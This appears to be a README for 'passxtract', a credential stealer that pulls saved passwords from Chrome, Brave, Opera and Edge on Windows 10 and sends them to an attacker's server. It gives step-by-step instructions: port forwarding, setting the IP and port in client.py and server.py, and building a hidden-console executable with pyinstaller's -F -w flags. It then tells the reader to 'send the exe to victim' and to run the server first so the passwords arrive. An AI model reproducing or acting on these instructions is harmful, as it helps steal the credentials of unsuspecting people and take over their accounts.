passxtract, extracts all passwords in the browsers: Google Chrome Brave Opera Microsoft Edge

if you have python test it out by running python3 server.py in the attackers computer & client.py in the victims win10 computer(if you dont have victim, run in ur win 10 virtual machine or in ur personal win 10 computer)

if victim does not have python isntalled convert client.py into an exe steps are here:

BUT BEFORE!!!
~~~You need to port forward in your router if you cant then there is no poin of this, setup a basic port forwarding service/setting & edit the server.py, client.py files
~~~in those files edit the ip & port in client.py & PORT ONLY in server.py(ip nad ports are your port forwarding settings)!

pip install pyinstaller==3.4
pyinstaller -F -w --paths C:\Windows\System32\downlevel client.py

pyinstaller --- module to convert it

-F --- make 1 st&alone file exe should be in the dist folder (delete pycache & build folder if u want)

-w --- hides the terminal when executed

client.py --- the file

rename the exe if u want & send the exe to victim

make SURE to run server.py before running client.py/the exe file or u wont get passwords!

ignore main.py since it only list ur pass, not send them...